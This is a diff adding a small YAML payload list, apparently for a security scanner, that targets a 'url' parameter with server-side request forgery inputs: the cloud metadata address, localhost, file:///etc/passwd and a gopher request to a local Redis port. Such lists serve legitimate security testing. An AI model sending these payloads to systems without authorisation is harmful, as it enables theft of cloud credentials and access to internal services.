@@ -1,0 +1,7 @@
+name: ssrf
+param: url
+payloads:
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://127.0.0.1:80/"
+  - "file:///etc/passwd"
+  - "gopher://127.0.0.1:6379/_INFO"
